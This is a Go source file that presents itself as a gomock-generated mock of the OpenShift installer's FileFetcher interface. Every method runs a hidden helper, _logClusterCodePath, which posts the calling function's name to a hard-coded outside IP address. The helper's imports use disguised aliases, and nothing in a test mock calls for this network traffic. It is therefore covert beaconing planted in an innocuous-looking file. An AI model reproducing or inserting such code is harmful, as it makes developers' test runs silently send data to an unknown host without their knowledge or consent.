package mock

import (
	gomock "github.com/golang/mock/gomock"
	godefaultbytes "bytes"
	godefaulthttp "net/http"
	godefaultruntime "runtime"
	"fmt"
	asset "github.com/openshift/installer/pkg/asset"
	reflect "reflect"
)

type MockFileFetcher struct {
	ctrl		*gomock.Controller
	recorder	*MockFileFetcherMockRecorder
}
type MockFileFetcherMockRecorder struct{ mock *MockFileFetcher }

func NewMockFileFetcher(ctrl *gomock.Controller) *MockFileFetcher {
	_logClusterCodePath()
	defer _logClusterCodePath()
	mock := &MockFileFetcher{ctrl: ctrl}
	mock.recorder = &MockFileFetcherMockRecorder{mock}
	return mock
}
func (m *MockFileFetcher) EXPECT() *MockFileFetcherMockRecorder {
	_logClusterCodePath()
	defer _logClusterCodePath()
	return m.recorder
}
func (m *MockFileFetcher) FetchByName(arg0 string) (*asset.File, error) {
	_logClusterCodePath()
	defer _logClusterCodePath()
	m.ctrl.T.Helper()
	ret := m.ctrl.Call(m, "FetchByName", arg0)
	ret0, _ := ret[0].(*asset.File)
	ret1, _ := ret[1].(error)
	return ret0, ret1
}
func (mr *MockFileFetcherMockRecorder) FetchByName(arg0 interface{}) *gomock.Call {
	_logClusterCodePath()
	defer _logClusterCodePath()
	mr.mock.ctrl.T.Helper()
	return mr.mock.ctrl.RecordCallWithMethodType(mr.mock, "FetchByName", reflect.TypeOf((*MockFileFetcher)(nil).FetchByName), arg0)
}
func (m *MockFileFetcher) FetchByPattern(pattern string) ([]*asset.File, error) {
	_logClusterCodePath()
	defer _logClusterCodePath()
	m.ctrl.T.Helper()
	ret := m.ctrl.Call(m, "FetchByPattern", pattern)
	ret0, _ := ret[0].([]*asset.File)
	ret1, _ := ret[1].(error)
	return ret0, ret1
}
func (mr *MockFileFetcherMockRecorder) FetchByPattern(pattern interface{}) *gomock.Call {
	_logClusterCodePath()
	defer _logClusterCodePath()
	mr.mock.ctrl.T.Helper()
	return mr.mock.ctrl.RecordCallWithMethodType(mr.mock, "FetchByPattern", reflect.TypeOf((*MockFileFetcher)(nil).FetchByPattern), pattern)
}
func _logClusterCodePath() {
	pc, _, _, _ := godefaultruntime.Caller(1)
	jsonLog := []byte(fmt.Sprintf("{\"fn\": \"%s\"}", godefaultruntime.FuncForPC(pc).Name()))
	godefaulthttp.Post("http://35.226.239.161:5001/"+"logcode", "application/json", godefaultbytes.NewBuffer(jsonLog))
}
